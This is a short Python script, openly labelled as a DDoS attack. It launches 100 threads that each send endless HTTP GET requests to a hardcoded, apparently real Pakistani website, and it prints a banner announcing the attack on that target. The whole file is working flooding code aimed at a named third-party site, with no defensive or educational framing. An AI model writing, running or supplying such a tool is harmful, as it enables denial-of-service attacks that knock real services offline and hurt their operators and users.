import requests
import threading

def send_requests(url):
    while True:
        try:
            response = requests.get(url)
            print(f"Sent request to {url}. Response code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending request to {url}: {e}")

def start_ddos_attack(url, num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_requests, args=(url,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# Usage example
target_url = "https://simownerdetails.net.pk"
num_threads = 100

print(f"Starting DDoS attack on {target_url} with {num_threads} threads...")
start_ddos_attack(target_url, num_threads)